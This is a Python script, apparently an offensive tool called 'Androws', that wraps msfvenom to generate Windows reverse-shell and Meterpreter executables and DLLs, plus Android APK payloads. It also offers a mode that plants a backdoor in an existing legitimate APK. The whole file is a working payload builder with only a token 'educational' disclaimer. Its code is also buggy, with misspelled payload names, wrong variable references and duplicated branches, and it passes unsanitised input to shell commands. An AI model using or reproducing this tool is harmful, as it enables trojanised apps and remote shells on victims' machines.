#! /usr/bin/env python3

import os
from time import sleep
import random
import webbrowser
import signal
from sys import platform
def handler(signum, frame):
    os.system("clear")
    print("Ctrl + C Detected Exiting")
    os.system("service apache2 stop | zenity --progress --pulsate --title 'PLEASE WAIT...' --text='Stop apache2 service' --percentage=0 --auto-close --width 300 > /dev/null 2>&1")
    os.system("service postgresql stop | zenity --progress --pulsate --title 'PLEASE WAIT...' --text='Stop postgresql service' --percentage=0 --auto-close --width 300 > /dev/null 2>&1")
    exit()

signal.signal(signal.SIGINT, handler)

os.system("clear")
os.system("resize -s 43 132 > /dev/null")
if not os.path.isdir("logs"):
    exit("Logs directory not found . Rerun setup.sh")
if not os.path.isfile("logs/msfconsole.log"):
    exit("Msfconsole is not installed properly. Rerun setup.sh")
print("[✔]Msfconsole Found")
sleep (1)
if not os.path.isfile("logs/jarsigner.log"):
    exit("Jarsigner is not installed properly. Rerun setup.sh")
print("[✔]Jarsigner Found")
sleep (1)
if not os.path.isfile("logs/xterm.log"):
    exit("Xterm is not installed properly. Rerun setup.sh")
print("[✔]Xterm Found")
sleep (1)
if not os.path.isfile("logs/apktool.log"):
    exit("apktool is not installed properly. Rerun setup.sh")
print("[✔]apktool Found")
sleep (1)
if not os.path.isfile("logs/aapt.log"):
    exit("appt.log is not installed properly. Rerun setup.sh")
print("[✔]Aapt Found")
sleep(1)
if not os.path.isfile("logs/zipalign.log"):
    exit("zipalign is not installed properly. Rerun setup.sh")
print("[✔]zipalign Found")
sleep(1)
if not os.path.isfile("logs/gradle.log"):
    exit("gradle is not installed properly. Rerun setup.sh")
sleep(1)
if not os.path.isfile("logs/zenity.log"):
    exit("zenity is not installed properly. Rerun setup.sh")
sleep (1)
if os.geteuid() != 0:
    exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")

if platform == "win32" :
       exit("This tool only works on Debain System!!!")
 

if not os.path.isfile("Eulaaccepted.txt"):
    print("""
          This tool is made for Educational purpose .Dont use this tool for illegal purposes
          Type (I accept Eula) 
        """)
    eula = input("Type Here :- ")
    if eula == "I accept Eula":
        os.system("echo 'Eula was accepted' > Eulaaccepted.txt")
    else:
        exit("You did'nt accept Eula You can't go ahead :(") 
os.system("service apache2 start | zenity --progress --pulsate --title 'PLEASE WAIT...' --text='Start apache2 service' --percentage=0 --auto-close --width 300 > /dev/null 2>&1")
os.system("service postgresql start | zenity --progress --pulsate --title 'PLEASE WAIT...' --text='Start postgresql service' --percentage=0 --auto-close --width 300 > /dev/null 2>&1")  
def main():
    os.system('clear')
    print(''' 
    ░█████╗░███╗░░██╗██████╗░██████╗░░█████╗░░██╗░░░░░░░██╗░██████╗
    ██╔══██╗████╗░██║██╔══██╗██╔══██╗██╔══██╗░██║░░██╗░░██║██╔════╝
    ███████║██╔██╗██║██║░░██║██████╔╝██║░░██║░╚██╗████╗██╔╝╚█████╗░
    ██╔══██║██║╚████║██║░░██║██╔══██╗██║░░██║░░████╔═████║░░╚═══██╗
    ██║░░██║██║░╚███║██████╔╝██║░░██║╚█████╔╝░░╚██╔╝░╚██╔╝░██████╔╝
    ╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░╚═╝░░╚═════╝░
    Author :- Hacker2425                  https://github.com/Hacker2425
    ''')
    if not os.path.isdir("output"):
        os.mkdir("output")
    print("1.Windows")
    print("2.Android")
    print("3.Jump to msfconsole")
    print("4.Buy me a coffe")
    print("e.Exit")

    choice = input("Androws==> ")
    if choice == ("1"):
        os.system("clear")
        print('''
        
██╗░░░██╗██╗███╗░░██╗██████╗░░█████╗░░██╗░░░░░░░██╗░██████╗
██║░░░██║██║████╗░██║██╔══██╗██╔══██╗░██║░░██╗░░██║██╔════╝
╚██╗░██╔╝██║██╔██╗██║██║░░██║██║░░██║░╚██╗████╗██╔╝╚█████╗░
░╚████╔╝░██║██║╚████║██║░░██║██║░░██║░░████╔═████║░░╚═══██╗
░░╚██╔╝░░██║██║░╚███║██████╔╝╚█████╔╝░░╚██╔╝░╚██╔╝░██████╔╝
░░░╚═╝░░░╚═╝╚═╝░░╚══╝╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚═════╝░
    (Vulnerable                                 Windows)
        ''')
        print("1.Meterprter")
        print("2.Shell")
        print("3.Meterpreter Dll")
        print("4.Shell DLL")
        print("5.Jump to Msfconsole")

        print("e.Go Back")

        vindows = input("Vindows==> ")
        if vindows == ("1"):
            Lhost = input("Vindows==>[LHOST] ")
            print("LHOST for payload : "+Lhost)
            Lport = input("Vindows==>[LPORT] ")
            print("LPORT for payload : "+Lport)
            Name = input("Vindows==>[Name] ")
            print("Name for payload : "+Name)
            meterpreter = 'msfvenom -p windows/meterpreter/reverse_tcp LHOST='+Lhost+' LPORT='+Lport+' -f exe > '+Name+'.exe'
            os.system(meterpreter)
            os.system("mv "+Name+".exe output/")
            os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
            main()
        elif vindows == ("2"):
            Lhost1 = input("Vindows==>[LHOST] ")
            print("LHOST for payload : "+Lhost1)
            Lport1 = input("Vindows==>[LPORT] ")
            print("LPORT for payload : "+Lport1)
            Name1 = input("Vindows==>[Name] ")
            print("Name for payload : "+Name1)
            Shell = 'msfvenom -p windows/shell_reverse_tcp LHOST='+Lhost1+' LPORT='+Lport1+' -f exe > '+Name1+'.exe'
            os.system(Shell)
            os.system("mv "+Name1+".exe output/")
            os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
            main()
        elif vindows == ('3'):
            Lhost2 = input("Vindows==>[LHOST] ")
            print("LHOST for payload : "+Lhost2)
            Lport2 = input("Vindows==>[LPORT] ")
            print("LPORT for payload : "+Lport2)
            Name2 = input("Vindows==>[Name] ")
            print("Name for payload : "+Name2)
            dll = 'msfvenom -p windows/meterpreter/reverse_tcp LHOST='+Lhost2+' LPORT='+Lport2+' -f dll > '+Name2+'.dll'
            os.system(dll)
            os.system("mv "+Name2+".dll output/")
            os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
            main()
        elif vindows == ('4'):
            Lhost3 = input("Vindows==>[LHOST] ")
            print("LHOST for payload : "+Lhost3)
            Lport3 = input("Vindows==>[LPORT] ")
            print("LPORT for payload : "+Lport3)
            Name3 = input("Vindows==>[Name] ")
            print("Name for payload : "+Name3)
            dllshell = 'msfvenom -p windows/shell_reverse_tcp LHOST='+Lhost3+' LPORT='+Lport3+' -f dll > '+Name3+'.dll'
            os.system(dllshell)
            os.system("mv "+Name3+".dll output/")
            os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
            main()
        elif vindows == ("5"):
            os.system("xterm -fa monaco -fs 13 -bg black -e 'msfconsole'")
            main()
        elif vindows == ("e"):
            main()
        else:
            main()
            os.system("zenity --title '☢ Androws ☢' --info --text 'Invalid Option' --width 400 > /dev/null 2>&1")
    elif choice == ('2'):
        os.system("clear")
        print('''
        
██╗░░░██╗██████╗░██████╗░░█████╗░██╗██████╗░
██║░░░██║██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗
╚██╗░██╔╝██║░░██║██████╔╝██║░░██║██║██║░░██║
░╚████╔╝░██║░░██║██╔══██╗██║░░██║██║██║░░██║
░░╚██╔╝░░██████╔╝██║░░██║╚█████╔╝██║██████╔╝
░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝╚═════╝░
(Vulnerable                           Droid)
        ''')
        print("1.APK MSF")
        print("2.BACKDOOR APK ORIGINAL")
        print("3.Jump to Msfconsole")
        print("e.Go Back")

        vdroid = input("VDROID==> ")
        if vdroid == ("1"):
            print("""
            1.android/meterpreter/reverse_tcp
            2.android/shell/reverse_tcp
            3.android/shell/reverse_http
            4.android/shell/reverse_https
            5.android/meterpreter/reverse_http
            6.android/meterpreter/reverse_https
            e.Back
            """) 
            payload = input("VDROID==> ")
            if payload == ("1"):
                vLhost = input("VDROID==>[LHOST] ")
                print("LHOST FOR PAYLOAD :"  +vLhost)
                vLport = input("VDROID==>[LPORT] ")
                print("LPORT FOR PAYLOAD :"  +vLport)
                vName = input("VDROID==>[Name] ")
                print("NAME FOR PAYLOAD :"  +vName)
                Vdroidp = 'msfvenom -p android/meterpreter/rverse_tcp LHOST='+vLhost+' LPORT='+vLport+' -o output/'+vName+'.apk'
                os.system(Vdroidp)
                os.system("mv "+vName+".apk output/")
                os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
                main()
            elif payload == ("2"):
                vLhost1 = input("VDROID==>[LHOST] ")
                print("LHOST FOR PAYLOAD :"  +vLhost1)
                vLport1 = input("VDROID==>[LPORT] ")
                print("LPORT FOR PAYLOAD :"  +vLport1)
                vName1 = input("VDROID==>[Name] ")
                print("NAME FOR PAYLOAD :"  +vName1)
                VDroidp1 = 'msfvenom -p android/shell/reverse_tcp LHOST='+vLhost1+' LPORT='+vLport+' -o output/'+vName1+'.apk'
                os.system(VDroidp1)
                os.system("mv "+vName1+".apk output/")
                os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
                main()
            elif payload == ("3"):
                vLhost2 = input("VDROID==>[LHOST] ")
                print("LHOST FOR PAYLOAD :"  + vLhost2)
                vLport2 = input("Vindows==>[LPORT] ")
                print("LPORT FOR PAYLOAD :" + vLport2)
                vLName2 = input("Vindows==>[Name] ")
                print("NAME FOR PAYLOAD :" +vLName2)
                Vdroidp2 = 'msfvenom -p android/shell/reverse_http LHOST='+vLhost2+' LPORT='+vLport2+' -o output/'+vLName2+'.apk'
                os.system(Vdroidp2)
                os.system("mv "+vLName2+".apk output/")
                os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
                main()
            elif payload == ('4'):
                VLhost3 = input("VDROID==>[LHOST] ")
                print("LHOST FOR PAYLOAD :" +VLhost3)
                VLport3 = input("VDROID==>[LPORT] ") 
                print("LPORT FOR PAYLOAD :" +VLport3)
                VLname3 = input("VDROID==>[NAME] ")
                print("NAME FOR PAYLOAD :" +VLname3)
                Vdroidp3 = 'msfvenom -p android/shell/reverse_https LHOST='+VLhost3+' LPORT='+VLport3+' -o output/'+VLname3+'.apk'
                os.system(Vdroidp3)
                os.system("mv "+VLName3+".apk output/")
                os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
                main()
            elif payload == ('5'):
                VLhost4 = input("VDROID==>[LHOST] ")
                print("LHOST FOR PAYLOAD :" +VLhost4)
                VLport4 = input("VDROID==>[LPORT] ")
                print("LPORT FOR PAYLOAD :" +VLport4)
                VLname4 = input("VDROID==>[NAME] ")
                print("NAME FOR PAYLOAD :" +VLname4)
                Vdroidp4 = 'msfvenom -p android/meterpreter/reverse_http LHOST='+VLhost4+' LPORT='+VLport4+' -o output/'+VLname4+'.apk'
                os.system(Vdroidp4)
                os.system("mv "+VLName4+".apk output/")
                os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
                main()
            elif payload == ('5'):
                VLhost5 = input("VDROID==>[LHOST] ")
                print("LHOST FOR PAYLOAD :" +VLhost5)
                VLport5 = input("VDROID==>[LPORT] ")
                print("LPORT FOR PAYLOAD :" +VLport5)
                VLname5 = input("VDROID==>[NAME] ")
                print("NAME FOR PAYLOAD :" +VLname5)
                Vdroidp5 = 'msfvenom -p android/meterpreter/reverse_https LHOST='+VLhost5+' LPORT='+VLport5+' -o output/'+VLname5+'.apk'
                os.system(Vdroidp5)
                os.system("mv "+VLName5+".apk output/")
                os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
                main()
            elif payload == 'e':
                main()
        elif vdroid == ('2'):#apk backdoor
            print("""
            1.android/meterpreter/reverse_tcp
            2.android/shell/reverse_tcp
            3.android/shell/reverse_http
            4.android/shell/reverse_https
            5.android/meterpreter/reverse_http
            6.android/meterpreter/reverse_https
            e.Back
            """) 
            payload1 = input("VDROID==> ")
            if payload1 == ("1"):
                vLhost100 = input("VDROID==>[LHOST] ")
                print("LHOST FOR PAYLOAD :"  +vLhost100)
                vLport100 = input("VDROID==>[LPORT] ")
                print("LPORT FOR PAYLOAD :"  +vLport100)
                vName100 = input("VDROID==>[Name] ")
                print("NAME FOR PAYLOAD :"  +vName100)
                Vpath100 = input("VDROID==>[PATH FOR APK FILE] ")
                Vdroidp100 = 'msfvenom -x '+Vpath100+' -p android/meterpreter/rverse_tcp LHOST='+vLhost100+' LPORT='+vLport100+' -o output/'+vName100+'.apk'
                os.system(Vdroidp100)
                os.system("mv "+vName100+".apk output/")
                os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
                main()
            elif payload1 == ("2"):
                vLhost111 = input("VDROID==>[LHOST] ")
                print("LHOST FOR PAYLOAD :"  +vLhost111)
                vLport111 = input("VDROID==>[LPORT] ")
                print("LPORT FOR PAYLOAD :"  +vLport111)
                vName111 = input("VDROID==>[Name] ")
                print("NAME FOR PAYLOAD :"  +vName111)
                Vpath111 = input("VDROID==>[PATH FOR APK FILE] ")
                VDroidp111 = 'msfvenom -x '+Vpath111+' -p android/shell/reverse_tcp LHOST='+vLhost111+' LPORT='+vLport111+' -o output/'+vName111+'.apk'
                os.system(VDroidp111)
                os.system("mv "+vName111+".apk output/")
                os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
                main()
            elif payload1 == ("3"):
                vLhost112 = input("VDROID==>[LHOST] ")
                print("LHOST FOR PAYLOAD :"  + vLhost112)
                vLport112 = input("Vindows==>[LPORT] ")
                print("LPORT FOR PAYLOAD :" + vLport112)
                vLName112 = input("Vindows==>[Name] ")
                print("NAME FOR PAYLOAD :" +vLName112)
                vpath112 = input("Vindows==>[PATH FOR APK FILE] ")
                Vdroidp112 = 'msfvenom -x '+vpath112+' -p android/shell/reverse_http LHOST='+vLhost112+' LPORT='+vLport112+' -o output/'+vLName112+'.apk'
                os.system(Vdroidp112)
                os.system("mv "+vLName112+".apk output/")
                os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
                main()
            elif payload1 == ('4'):
                VLhost113 = input("VDROID==>[LHOST] ")
                print("LHOST FOR PAYLOAD :" +VLhost113)
                VLport113 = input("VDROID==>[LPORT] ") 
                print("LPORT FOR PAYLOAD :" +VLport113)
                VLname113 = input("VDROID==>[NAME] ")
                print("NAME FOR PAYLOAD :" +VLname113)
                Vpath113 = input("VDROID==>[PATH FOR APK FILE] ")
                Vdroidp113 = 'msfvenom -x '+Vpath113+' -p android/shell/reverse_https LHOST='+VLhost3+' LPORT='+VLport3+' -o output/'+VLname3+'.apk'
                os.system(Vdroidp113)
                os.system("mv "+VLName3+".apk output/")
                os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
                main()
            elif payload1 == ('5'):
                VLhost114 = input("VDROID==>[LHOST] ")
                print("LHOST FOR PAYLOAD :" +VLhost114)
                VLport114 = input("VDROID==>[LPORT] ")
                print("LPORT FOR PAYLOAD :" +VLport114)
                VLname114 = input("VDROID==>[NAME] ")
                print("NAME FOR PAYLOAD :" +VLname114)
                Vpath114 = input("VDROID==>[PATH FOR APK FILE] ")
                Vdroidp114 = 'msfvenom -x '+Vpath114+' -p android/meterpreter/reverse_http LHOST='+VLhost114+' LPORT='+VLport114+' -o output/'+VLname114+'.apk'
                os.system(Vdroidp114)
                os.system("mv "+VLName114+".apk output/")
                os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
                main()
            elif payload1 == ('5'):
                VLhost115 = input("VDROID==>[LHOST] ")
                print("LHOST FOR PAYLOAD :" +VLhost115)
                VLport115 = input("VDROID==>[LPORT] ")
                print("PORT FOR PAYLOAD :" +VLport115)
                VLname115 = input("VDROID==>[NAME] ")
                print("NAME FOR PAYLOAD :" +VLname115)
                Vpath115 = input("VDROID==>[PATH FOR APK FILE] ")
                Vdroidp115 = 'msfvenom -x '+Vpath115+' -p android/meterpreter/reverse_https LHOST='+VLhost115+' LPORT='+VLport115+' -o output/'+VLname115+'.apk'
                os.system(Vdroidp115)
                os.system("mv "+VLName115+".apk output/")
                os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
                main()
            elif payload1 == ('e'):
                main()
        elif vdroid == ("3"):
            os.system("xterm -fa monaco -fs 13 -bg black -e 'msfconsole'")
    elif choice == ("3"):
            os.system("xterm -fa monaco -fs 13 -bg black -e 'msfconsole'")
    elif choice == ("4"):
        webbrowser.open("https://www.buymeacoffee.com/IamHacker")
    else:
        os.system("service apache2 stop | zenity --progress --pulsate --title 'PLEASE WAIT...' --text='Stop apache2 service' --percentage=0 --auto-close --width 300 > /dev/null 2>&1")
        os.system("service postgresql start | zenity --progress --pulsate --title 'PLEASE WAIT...' --text='Stop postgresql service' --percentage=0 --auto-close --width 300 > /dev/null 2>&1")
        os.system("clear")
        exit("Thanks For Using Androws| Report bugs on Github | Hacker India :)")
main()
